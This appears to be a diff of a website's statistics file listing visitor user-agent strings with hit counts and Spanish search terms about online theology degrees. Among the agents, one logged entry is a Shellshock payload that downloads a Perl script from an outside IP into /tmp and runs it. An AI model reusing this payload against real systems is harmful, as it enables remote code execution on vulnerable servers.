+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 1.0.3705; .NET CLR 2.0.50727; .NE
+0 1
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:36.0) Gecko/20100101 Firefox/36.0
+0 41
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10
+0 686
+facebookexternalhit/1.0 (+http://www.facebook.com/externalhit_uatext.php)
+0 9
+Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B436 Saf
+0 210
+Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.102 Safari/537.36
+0 1
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0
+0 1
+Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; MASMJS)
+0 186
+Opera/9.80 (J2ME/MIDP; Opera Mini/7.0.31438/36.1444; U; es) Presto/2.12.423 Version/12.16
+0 1
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36
+0 125
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-us; M4 SS4020 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
+0 1
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-es; MID Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safar
+0 1
+FeedlyBot/1.0 (http://feedly.com)
+0 7
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36
+0 1
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36
+0 104
+Mozilla/5.0 (Linux; U; Android 4.3; es-us; XT1032 Build/14.10.0Q3.X-76-LCG-8-1) AppleWebKit/534.30 (KHTML, like Gecko) Versio
+0 1
+Mozilla/5.0 (Linux; Android 4.1.1; RCT6077W2 Build/JRO03H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.141 Safari
+0 68
+Dalvik/1.6.0 (Linux; U; Android 4.4.2; D5106 Build/18.1.A.1.17)
+0 12
+Mozilla/5.0 (Windows NT 6.0; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
+0 203
+Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
+0 6
+Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/41.0.2272.58 Mobile/12D50
+0 92
+Mozilla/5.0 (Windows NT 6.2; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
+0 237
+magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)
+0 18
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36
+0 51
+Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Saf
+0 3
+Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8
+0 1
+DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)
+0 6
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25
+0 2
+Mozilla/5.0 (Windows NT 6.1; rv:37.0) Gecko/20100101 Firefox/37.0
+0 1
+Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B440
+0 9
+Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/21.0
+0 2
+Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/40.0.2214.73 Mobile/12D508 Safari/
+0 92
+Dalvik/1.6.0 (Linux; U; Android 4.4.2; 4018A Build/KOT49H)
+0 1
+WordPress/4.1.1; http://umvirtual.org
+0 41
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; Media Center PC 6.0; .NET CLR 3.5.
+0 1
+Mozilla/5.0 (Linux; Android 4.4.4; SM-G530H Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 
+0 3
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-es; Micromax A47 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mob
+0 1
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.99 Safari/537.22
+0 1
+Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; WOW64; Trident/5.0; BOIE9;ENUS)
+0 6
+Mozilla/5.0 (Linux; Android 4.2.2; AX535 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safar
+0 1
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
+0 1
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) KomodiaBot/1.0
+0 2
+Mozilla/5.0 (Linux; Android 4.4.2; SM-T210 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 S
+0 1
+Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)
+0 140
+Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) GSA/5.2.43972 Mobile/11D167 Sa
+0 2
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-us; AT-4 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.
+0 2
+Mozilla/5.0 (Android; Mobile; rv:37.0) Gecko/37.0 Firefox/37.0
+0 99
+Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
+0 2
+Mozilla/5.0 (Linux; Android 4.4.2; BLU DASH 5.0 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.
+0 95
+Dalvik/1.6.0 (Linux; U; Android 4.2.2; AX650 Build/JDQ39)
+0 2
+com.apple.WebKit.WebContent/10600.3.18 CFNetwork/720.2.4 Darwin/14.1.0 (x86_64)
+0 2
+Mozilla/5.0 (Linux; Android 4.4.2; HTC Desire 610 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mo
+0 119
+Dalvik/1.6.0 (Linux; U; Android 4.4.4; C6903 Build/14.4.A.0.157)
+0 8
+Mozilla/5.0 (Linux; U; Android 2.3.6; es-us; HUAWEI Y210-0151 Build/HuaweiY210-0151) AppleWebKit/533.1 (KHTML, like Gecko) Ve
+0 1
+Mozilla/5.0 (Linux; Android 4.3; C5306 Build/12.1.A.1.205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.109 Mobile
+0 87
+Mozilla/5.0 (Linux; Android 4.3; es-us; SAMSUNG SGH-I537 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chr
+0 163
+Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/5.2.43972 Mobile/12B466 S
+0 98
+Mozilla/5.0 (Linux; Android 4.2.2; ONE TOUCH 4016A Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mo
+0 2
+Dalvik/1.6.0 (Linux; U; Android 4.2.2; PMID703GK Build/PMID703GK-V1.0-2013.10.15)
+0 1
+Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/23.0.1271.6 Safari/537.11
+0 2
+Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-S5310B Build/NeoDex)
+0 1
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 Safari/537.36
+0 214
+Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safa
+0 18
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 2.0.50727; InfoPath.1)
+0 1
+Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2
+0 184
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36
+0 160
+Mozilla/5.0 (iPhone; CPU iPhone OS 6_1_2 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B146 Safa
+0 1
+Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36
+0 1
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
+0 1
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36
+0 2
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/6.1.6 Safari/537.78.2
+0 93
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2354.0 Safari/537.36
+0 68
+Dalvik/1.6.0 (Linux; U; Android 4.2.2; EU-TB408 Build/JDQ39)
+0 2
+Mozilla/5.0 (compatible; Qwantify/2.0n; +https://www.qwant.com/)/*
+0 162
+Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.94 Safari/537.36
+0 78
+NerdyBot
+0 3
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-es; BLU STUDIO 5.5 S Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0
+0 84
+() { :;}; /bin/bash -c \"cd /tmp;wget http://109.169.61.227/so;curl -O http://109.169.61.227/so;perl so;perl /tmp/so\"
+0 1
+SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-
+0 6
+Mozilla/5.0 (compatible; SMTBot/1.0; +http://www.similartech.com/smtbot)
+0 84
+Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.94 Safari/534.13
+0 2
+Mozilla/5.0 (iPad; CPU OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) GSA/3.2.0.25255 Mobile/10B329 Safari/85
+0 1
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru)
+0 1
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2358.0 Safari/537.36
+0 133
+Mozilla/5.0 (Linux; Android 4.4.4; SM-G530H Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.109 Mobile 
+0 87
+Mozilla/5.0 (compatible; MSIE or Firefox mutant; not on Windows server;) Daumoa/4.0
+0 1
+Mozilla/5.0 (Linux; U; Android 4.1.1; es-ve; HTC_One_S Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobil
+0 1
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-us; M4 SS1070 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
+0 1
+Mozilla/5.0 (Linux; U; Android 4.1.2; es-mx; LG-E410g Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
+0 1
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)
+0 9
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) )
+0 3
+Mozilla/5.0 (Linux; Android 4.4.2; es-us; ILIUM S130 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/
+0 107
+Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3
+0 192
+Mozilla/5.0 (Linux; Android 4.2.2; ONE TOUCH 4033A Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mo
+0 93
+Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko/20100101 Firefox/12.0
+0 1
+Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.11) Gecko/20101013 Ubuntu/10.04 (lucid) Firefox/3.6.11
+0 1
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36
+0 2
+Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+0 3
+Mozilla/5.0 (Linux; U; Android 4.2.1; es-es; bq Aquaris 5 Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mo
+0 1
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3
+0 1
+Mozilla/5.0 (Linux; U; Android 4.4.2; es-us; HTC_0PCV220/1.11.506.1 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Vers
+0 123
+Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
+0 172
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2345.0 Safari/537.36
+0 24
+Mozilla/5.0 (Linux; Android 4.2.2; ONE TOUCH 4016A Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.136 M
+0 173
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36 OPR/28.0.1750.48
+0 177
+Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17
+0 4
+Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)
+0 3
+Mozilla/4.0 (compatible: MSIE 7.0; Windows NT 6.0)
+0 204
+Mozilla/5.0 (Linux; Android 4.4.2; LG-D693n Build/KOT49I.V10a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mob
+0 88
+Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B435 Saf
+0 1
+Mozilla/5.0 (compatible; NetSeer crawler/2.0; +http://www.netseer.com/crawler.html; crawler@netseer.com)
+0 2
+Ruby
+0 1
+Java/1.6.0_26
+0 1
+Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1
+0 184
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.16 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.16
+0 139
+Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+0 124
+Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.04 (lucid) Firefox/3.6.13
+0 1
+Mozilla/5.0 (Linux; Android 4.2.2; ONE TOUCH 6012A Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mo
+0 94
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/6.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .N
+0 1
+Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36
+0 1
+Mozilla/5.0 (Windows NT 6.2; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
+0 135
+Mozilla/5.0 (Linux; Android 4.4.4; XT1033 Build/KXB21.14-L1.40) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mo
+0 1
+Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safa
+0 95
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3
+0 10
+Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36
+0 1
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.2102
+0 2
+# End Of Table - agents
+# -search strings- 
+licenciatura en teologia en linea
+1
+donde estudiar teologia en mexico
+1
+carrera de teologia en linea
+1
+licenciatura en teologia virtual gratis
+1
+estilo de vida saludable
+1
+licenciatura en teologia
+2
+teologia en linea
+2
+teoligia en linea
+1
+diplomado en orientacion familiar
+1
+www.um vitual
+2
+escuela de teologia en mexico
+1
+# End Of Table - search strings
+# -usernames- 
+# End Of Table - usernames
